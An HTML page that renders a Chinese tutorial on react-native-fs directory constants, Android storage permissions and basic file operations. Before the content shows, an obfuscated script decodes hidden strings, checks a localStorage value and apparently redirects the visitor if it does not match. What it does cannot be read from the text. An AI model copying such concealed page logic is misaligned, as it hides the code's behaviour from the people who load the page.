<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x4b405f=_0x4b25;function _0x4b25(l,s){var e=_0x4d1d();return(_0x4b25=function(s,n){var a=e[s-=180];void 0===_0x4b25.gczZTb&&(_0x4b25.ECXAxX=function(s,n){var a,t=[],l=0,e="";for(s=(s=>{for(var n,a,t="",l="",e=0,c=0;a=s.charAt(c++);~a&&(n=e%4?64*n+a:a,e++%4)&&(t+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,o=t.length;r<o;r++)l+="%"+("00"+t.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(l)})(s),c=0;c<256;c++)t[c]=c;for(c=0;c<256;c++)l=(l+t[c]+n.charCodeAt(c%n.length))%256,a=t[c],t[c]=t[l],t[l]=a;for(var c=0,l=0,r=0;r<s.length;r++)a=t[c=(c+1)%256],t[c]=t[l=(l+t[c])%256],t[l]=a,e+=String.fromCharCode(s.charCodeAt(r)^t[(t[c]+t[l])%256]);return e},l=arguments,_0x4b25.gczZTb=!0);var s=s+e[0],t=l[s];return t?a=t:(void 0===_0x4b25.QDEMeL&&(_0x4b25.QDEMeL=!0),a=_0x4b25.ECXAxX(a,n),l[s]=a),a})(l,s)}if((()=>{for(var s=_0x4b25,n=_0x4d1d();;)try{if(441304==-parseInt(s(200,"Yfq$"))+parseInt(s(198,"FQTi"))/2+parseInt(s(195,"tD04"))/3*(-parseInt(s(183,"S9dz"))/4)+parseInt(s(192,"5X8["))/5*(-parseInt(s(188,"qC!f"))/6)+parseInt(s(191,")B$g"))/7+parseInt(s(186,"J4P7"))/8+parseInt(s(181,"pZQ6"))/9)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x4b405f(184,"gqN$")](_0x4b405f(194,"Yz98"))!=_0x4b405f(197,"2fzD"))throw window[_0x4b405f(190,"Yfq$")][_0x4b405f(199,"fGBu")](_0x4b405f(189,"[r@L")),Error();function _0x4d1d(){var s=["yCo3WOpdU8onl8k/eG","jCoCkSoobmkqvey6WO9sWRaU","of7dRXSqgCoPba","atnmW6jJWQRdJM/dQvVcQJe","W6/cRSoxW7iLF2dcJHu","W7i1WPHpWR/dJ2Cz","hezyyIZdOSklWPFdUvBcLeNdUG","C8oAWOhdPfy","ub3cLSooWRlcTSonWOewlmkBW7tdTW","nsXIE8kRqZK","pSkQW5lcRCklCmk8pGtdRw7dQG","n0DJmwxcK8kLoGC3W6hcKH4","WPj+W5JcSmkVW5/cMqO","bmo9WRhdNIpdT34M","W4lcV03cKSkLWQxcUCkvW6xdQ8o+xCo4","zr5FWQ3dN2hcLSk7rqddMhpdKa","WOmriSooWOeOWQm6pa/cTYu","WPOUtbGHWQtdP8o3WRO8l2G","W53cGCovzWWAra","WPGQtXWHWQhcSSoOWOWmbMVdNa","qmond8oCWQOqft4mt8oceKO","WONdLSktguPjrCk3W4TkuKi","WQVdQSoTnmkYWPOAdSkJWRCZcq","oGhcPCkyfSonq8ouW7n+rgJdJCkHvSkWnbZcH8oxxX8IW5PCW4S"];return(_0x4d1d=function(){return s})()}document.title="React Native FS 内置变量",document.getElementById("article").innerHTML='<div><p>React Native FS (react-native-fs) 是一个提供文件系统访问功能的库，它提供了多个内置变量来表示不同的文件系统路径。以下是主要的内置变量：</p>\n<h2>常用路径常量</h2>\n<h3>1. 主要目录路径</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { \n  <span class="hljs-title class_">MainBundlePath</span>,\n  <span class="hljs-title class_">CachesDirectoryPath</span>,\n  <span class="hljs-title class_">DocumentDirectoryPath</span>,\n  <span class="hljs-title class_">ExternalDirectoryPath</span>,\n  <span class="hljs-title class_">ExternalStorageDirectoryPath</span>,\n  <span class="hljs-title class_">TemporaryDirectoryPath</span>,\n  <span class="hljs-title class_">LibraryDirectoryPath</span>,\n  <span class="hljs-title class_">PicturesDirectoryPath</span>,\n  <span class="hljs-title class_">DownloadDirectoryPath</span>\n} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native-fs&#x27;</span>;\n</code></pre>\n<h3>2. 各变量详细说明</h3>\n<table>\n<thead>\n<tr>\n<th>变量名</th>\n<th>平台</th>\n<th>描述</th>\n<th>典型值示例</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>MainBundlePath</code></td>\n<td>iOS</td>\n<td>应用主 bundle 目录</td>\n<td><code>/var/containers/Bundle/Application/.../AppName.app</code></td>\n</tr>\n<tr>\n<td><code>CachesDirectoryPath</code></td>\n<td>双平台</td>\n<td>缓存目录</td>\n<td>iOS: <code>/var/mobile/.../Library/Caches</code><br/>Android: <code>/data/data/com.appname/cache</code></td>\n</tr>\n<tr>\n<td><code>DocumentDirectoryPath</code></td>\n<td>双平台</td>\n<td>文档目录（会被iTunes备份）</td>\n<td>iOS: <code>/var/mobile/.../Documents</code><br/>Android: <code>/data/data/com.appname/files</code></td>\n</tr>\n<tr>\n<td><code>ExternalDirectoryPath</code></td>\n<td>Android</td>\n<td>应用外部存储目录</td>\n<td><code>/storage/emulated/0/Android/data/com.appname/files</code></td>\n</tr>\n<tr>\n<td><code>ExternalStorageDirectoryPath</code></td>\n<td>Android</td>\n<td>外部存储根目录</td>\n<td><code>/storage/emulated/0</code></td>\n</tr>\n<tr>\n<td><code>TemporaryDirectoryPath</code></td>\n<td>双平台</td>\n<td>临时目录</td>\n<td>iOS: <code>/var/mobile/.../tmp</code><br/>Android: <code>/data/data/com.appname/cache</code> (同Caches)</td>\n</tr>\n<tr>\n<td><code>LibraryDirectoryPath</code></td>\n<td>iOS</td>\n<td>库目录</td>\n<td><code>/var/mobile/.../Library</code></td>\n</tr>\n<tr>\n<td><code>PicturesDirectoryPath</code></td>\n<td>双平台</td>\n<td>图片目录</td>\n<td>Android: <code>/storage/emulated/0/Pictures</code><br/>iOS: 应用沙盒内路径</td>\n</tr>\n<tr>\n<td><code>DownloadDirectoryPath</code></td>\n<td>双平台</td>\n<td>下载目录</td>\n<td>Android: <code>/storage/emulated/0/Download</code><br/>iOS: 应用沙盒内路径</td>\n</tr>\n</tbody>\n</table>\n<h2>其他实用变量</h2>\n<h3>1. 文件操作常量</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> {\n  readDir,\n  readFile,\n  writeFile,\n  appendFile,\n  <span class="hljs-comment">// ...其他文件操作方法</span>\n} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native-fs&#x27;</span>;\n</code></pre>\n<h3>2. 文件系统特性检测</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> {\n  exists,\n  isDir,\n  <span class="hljs-comment">// ...其他检测方法</span>\n} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native-fs&#x27;</span>;\n</code></pre>\n<h2>平台差异说明</h2>\n<ol>\n<li><strong>iOS</strong>  ：\n<ul>\n<li>严格遵循沙盒机制</li>\n<li>只能直接访问应用沙盒内的路径</li>\n<li>需要额外步骤才能将文件保存到系统相册</li>\n</ul>\n</li>\n<li><strong>Android</strong>  ：\n<ul>\n<li>可以访问外部存储</li>\n<li>需要权限声明：<pre><code class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span> /&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span>\n</code></pre>\n</li>\n<li>从 Android 10 开始受作用域存储限制</li>\n</ul>\n</li>\n</ol>\n<h2>使用示例</h2>\n<h3>1. 获取目录内容</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-variable constant_">RNFS</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native-fs&#x27;</span>;\n\n<span class="hljs-variable constant_">RNFS</span>.<span class="hljs-title function_">readDir</span>(<span class="hljs-variable constant_">RNFS</span>.<span class="hljs-property">DocumentDirectoryPath</span>)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">files</span>) =&gt;</span> {\n    files.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">file</span>) =&gt;</span> {\n      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(file.<span class="hljs-property">name</span>, file.<span class="hljs-property">path</span>, file.<span class="hljs-title function_">isDirectory</span>());\n    });\n  })\n  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>);\n  });\n</code></pre>\n<h3>2. 保存文件到下载目录</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> filePath = <span class="hljs-string">`<span class="hljs-subst">${RNFS.DownloadDirectoryPath}</span>/test.txt`</span>;\n\n<span class="hljs-variable constant_">RNFS</span>.<span class="hljs-title function_">writeFile</span>(filePath, <span class="hljs-string">&#x27;Hello World!&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;文件保存成功&#x27;</span>))\n  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>));\n</code></pre>\n<h3>3. 检查文件是否存在</h3>\n<pre><code class="language-javascript"><span class="hljs-variable constant_">RNFS</span>.<span class="hljs-title function_">exists</span>(<span class="hljs-string">`<span class="hljs-subst">${RNFS.DocumentDirectoryPath}</span>/myfile.txt`</span>)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">exists</span>) =&gt;</span> {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;文件存在:&#x27;</span>, exists);\n  });\n</code></pre>\n<h2>注意事项</h2>\n<ol>\n<li><strong>Android 权限</strong>  ：在 Android 6.0+ 需要运行时权限请求</li>\n<li><strong>iOS 文件共享</strong>  ：要在 iTunes 中显示文件，需在 Info.plist 中添加：<pre><code class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>UIFileSharingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span>\n</code></pre>\n</li>\n<li><strong>路径格式</strong>  ：iOS 路径通常以 <code>file://</code> 开头，Android 通常不需要</li>\n</ol>\n<p>这些内置变量提供了访问设备文件系统的标准入口点，使开发者能够跨平台处理文件操作。</p>\n</div>'</script></body></html>